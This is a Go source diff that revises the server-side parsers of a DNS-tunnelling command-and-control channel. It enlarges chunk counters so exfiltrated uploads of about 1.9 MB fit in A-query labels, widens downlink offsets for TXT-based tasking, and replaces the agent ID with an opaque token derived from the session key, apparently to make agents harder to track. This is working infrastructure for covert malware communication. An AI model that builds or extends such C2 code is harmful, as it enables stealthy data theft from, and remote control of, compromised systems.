@@ -55,14 +55,14 @@ func dnsBase32Decode(s string) ([]byte, error) {
 
 // dnsParseUploadFqdn parses an uplink A-query FQDN.
 //
-// Format: <b32chunk>.<seq4><cid2><tot2>.<aid8>.<zone>
+// Format: <b32chunk>.<seq4><cid4><tot4>.<tok8>.<zone>
 //   - b32chunk: RFC 4648 base32 encoded binary chunk (≤ 48 chars)
 //   - seq4:     4 hex chars — 16-bit rolling packet sequence
-//   - cid2:     2 hex chars — chunk index within packet (0-based)
-//   - tot2:     2 hex chars — total chunk count for this packet
-//   - aid8:     8 hex chars — 32-bit agent ID (0x00000000 = registration)
+//   - cid4:     4 hex chars — chunk index within packet (0-based, 0–65535)
+//   - tot4:     4 hex chars — total chunk count for this packet (1–65535)
+//   - tok8:     8 hex chars — opaque per-session token (derived from AES key, not agent ID)
 //   - zone:     configured C2 zone domain
-func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, aid uint32, err error) {
+func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, tok uint32, err error) {
 	name = strings.TrimSuffix(name, ".")
 	zone = strings.TrimSuffix(zone, ".")
 
@@ -74,7 +74,7 @@ func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, 
 	}
 	name = name[:len(name)-len(suffix)]
 
-	// Expected: <b32chunk> . <seq4><cid2><tot2> . <aid8>
+	// Expected: <b32chunk> . <seq4><cid4><tot4> . <tok8>
 	labels := strings.Split(name, ".")
 	if len(labels) != 3 {
 		err = errors.New("uplink fqdn: expected 3 labels before zone")
@@ -86,10 +86,12 @@ func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, 
 		return
 	}
 
-	// metaLabel: seq4(4) + cid2(2) + tot2(2) = 8 hex chars
+	// metaLabel: seq4(4) + cid4(4) + tot4(4) = 12 hex chars
+	// cid and tot are 2 bytes each so payloads up to 65535×30 ≈ 1.9 MB are supported
+	// without the chunk counter wrapping (old 2-hex/1-byte encoding capped at 255 chunks).
 	metaLabel := labels[1]
-	if len(metaLabel) != 8 {
-		err = errors.New("uplink fqdn: meta label must be 8 hex chars")
+	if len(metaLabel) != 12 {
+		err = errors.New("uplink fqdn: meta label must be 12 hex chars")
 		return
 	}
 	var meta []byte
@@ -98,33 +100,33 @@ func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, 
 		return
 	}
 	seq = uint16(meta[0])<<8 | uint16(meta[1])
-	cid = uint16(meta[2])
-	tot = uint16(meta[3])
+	cid = uint16(meta[2])<<8 | uint16(meta[3])
+	tot = uint16(meta[4])<<8 | uint16(meta[5])
 
-	// aid8: 8 hex chars = 4 bytes
-	aidLabel := labels[2]
-	if len(aidLabel) != 8 {
-		err = errors.New("uplink fqdn: aid label must be 8 hex chars")
+	// tok8: 8 hex chars — opaque session token
+	tokLabel := labels[2]
+	if len(tokLabel) != 8 {
+		err = errors.New("uplink fqdn: token label must be 8 hex chars")
 		return
 	}
-	var aidBytes []byte
-	aidBytes, err = hex.DecodeString(aidLabel)
+	var tokBytes []byte
+	tokBytes, err = hex.DecodeString(tokLabel)
 	if err != nil {
 		return
 	}
-	aid = uint32(aidBytes[0])<<24 | uint32(aidBytes[1])<<16 | uint32(aidBytes[2])<<8 | uint32(aidBytes[3])
+	tok = uint32(tokBytes[0]) | uint32(tokBytes[1])<<8 | uint32(tokBytes[2])<<16 | uint32(tokBytes[3])<<24
 	return
 }
 
 // dnsParseDownlinkFqdn parses a downlink TXT-query FQDN.
 //
-// Format: p.<seq4>.<off4>.<aid8>.<zone>
+// Format: p.<seq4>.<off8>.<tok8>.<zone>
 //   - p:    literal prefix distinguishing downlink polls
 //   - seq4: 4 hex chars — same sequence as the uplink that produced this response
-//   - off4: 4 hex chars — byte offset into the queued response (step = dnsTXTChunkSize)
-//   - aid8: 8 hex chars — 32-bit agent ID
+//   - off8: 8 hex chars — byte offset into the queued response (DWORD; supports up to 4 GB)
+//   - tok8: 8 hex chars — opaque per-session token matching the uplink
 //   - zone: configured C2 zone domain
-func dnsParseDownlinkFqdn(name, zone string) (seq uint16, offset uint16, aid uint32, err error) {
+func dnsParseDownlinkFqdn(name, zone string) (seq uint16, offset uint32, tok uint32, err error) {
 	name = strings.TrimSuffix(name, ".")
 	zone = strings.TrimSuffix(zone, ".")
 
@@ -136,10 +138,10 @@ func dnsParseDownlinkFqdn(name, zone string) (seq uint16, offset uint16, aid uin
 	}
 	name = name[:len(name)-len(suffix)]
 
-	// Expected: p . <seq4> . <off4> . <aid8>
+	// Expected: p . <seq4> . <off8> . <tok8>
 	labels := strings.Split(name, ".")
 	if len(labels) != 4 || labels[0] != "p" {
-		err = errors.New("downlink fqdn: expected p.<seq4>.<off4>.<aid8> before zone")
+		err = errors.New("downlink fqdn: expected p.<seq4>.<off8>.<tok8> before zone")
 		return
 	}
 
@@ -155,25 +157,26 @@ func dnsParseDownlinkFqdn(name, zone string) (seq uint16, offset uint16, aid uin
 	}
 	seq = uint16(b[0])<<8 | uint16(b[1])
 
-	if len(labels[2]) != 4 {
-		err = errors.New("downlink fqdn: offset must be 4 hex chars")
+	if len(labels[2]) != 8 {
+		err = errors.New("downlink fqdn: offset must be 8 hex chars")
 		return
 	}
 	b, err = hex.DecodeString(labels[2])
 	if err != nil {
 		return
 	}
-	offset = uint16(b[0])<<8 | uint16(b[1])
+	offset = uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
 
 	if len(labels[3]) != 8 {
-		err = errors.New("downlink fqdn: aid must be 8 hex chars")
+		err = errors.New("downlink fqdn: token must be 8 hex chars")
 		return
 	}
-	b, err = hex.DecodeString(labels[3])
+	var tokBytes []byte
+	tokBytes, err = hex.DecodeString(labels[3])
 	if err != nil {
 		return
 	}
-	aid = uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
+	tok = uint32(tokBytes[0]) | uint32(tokBytes[1])<<8 | uint32(tokBytes[2])<<16 | uint32(tokBytes[3])<<24
 	return
 }
 
